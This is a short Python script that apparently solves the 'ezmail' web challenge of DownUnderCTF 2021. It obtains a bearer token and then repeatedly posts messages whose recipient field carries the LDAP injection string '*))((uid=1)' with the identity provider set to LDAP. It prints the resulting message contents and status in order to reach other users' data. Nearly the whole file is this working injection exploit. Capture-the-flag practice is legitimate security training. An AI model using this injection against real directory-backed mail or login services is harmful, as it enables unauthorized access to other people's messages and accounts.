import requests
from requests.api import get, head
import string

TARGET_URL="https://web-ezmail-7a7e2d6b.chal-2021.duc.tf"

def get_token():
    res=requests.post(f"{TARGET_URL}/token")
    token=res.json()
    return token.get('access_token')

def get_me(token):
    headers={
        "Authorization":f"Bearer {token}"
    }
    res=requests.get(f"{TARGET_URL}/me",headers=headers)
    me=res.json()
    return me.get('user_id')

def get_me_inbox(token):
    headers={
        "Authorization":f"Bearer {token}"
    }
    res=requests.get(f"{TARGET_URL}/me/inbox",headers=headers)
    print(res.text)

def send_message(id,msg,token):
    headers={
        "Authorization":f"Bearer {token}"
    }
    body={
        "recipients":[
            id
        ],
        "content":msg,
        "identity_provider":"ldap"
    }
    res=requests.post(f"{TARGET_URL}/message",headers=headers,json=body)
    return res.json()

def see_message(id,token):
    headers={
        "Authorization":f"Bearer {token}"
    }
    res=requests.get(f"{TARGET_URL}/message/{id}",headers=headers)
    print(res.text)

def msg_status(id,token):
    headers={
        "Authorization":f"Bearer {token}"
    }
    res=requests.get(f"{TARGET_URL}/message/{id}/status",headers=headers)
    return res.text


def main():
    token=get_token()
    me=get_me(token)
    for i in range(0,256):
        i=format(i,'x')
        print(i)
        msg_id=send_message(f'*))((uid=1)','test',token)
        see_message(msg_id,token)
        print(msg_status(msg_id,token))
    #see_message(msg_id,token)

main()